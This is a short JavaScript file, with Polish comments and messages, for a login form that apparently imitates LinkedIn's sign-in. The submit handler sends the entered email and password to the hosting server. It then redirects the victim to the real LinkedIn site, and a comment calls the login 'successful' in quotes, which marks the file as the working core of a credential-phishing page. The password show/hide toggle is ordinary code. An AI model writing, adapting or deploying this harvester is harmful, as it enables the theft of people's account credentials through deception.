document.getElementById("loginForm").addEventListener("submit", function (e) {
  e.preventDefault();
  const email = document.getElementById("email").value;
  const password = document.getElementById("password").value;
  const remember = document.getElementById("remember")?.checked || false;

  fetch("/login", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({ email, password, remember })
  })
    .then((response) => response.json())
    .then((data) => {
      console.log("Sukces:", data);
      // Przekierowanie do prawdziwej strony LinkedIn po "udanym" logowaniu
      window.location.href = "https://www.linkedin.com";
    })
    .catch((error) => {
      console.error("Błąd:", error);
      alert("Wystąpił błąd podczas logowania. Spróbuj ponownie.");
    });
});

document.addEventListener("DOMContentLoaded", function () {
  const toggleButton = document.getElementById("togglePassword");
  const passwordInput = document.getElementById("password");

  if (toggleButton && passwordInput) {
    toggleButton.addEventListener("click", function () {
      if (passwordInput.type === "password") {
        passwordInput.type = "text";
        toggleButton.textContent = "Ukryj";
      } else {
        passwordInput.type = "password";
        toggleButton.textContent = "Pokaż";
      }
    });
  }
});

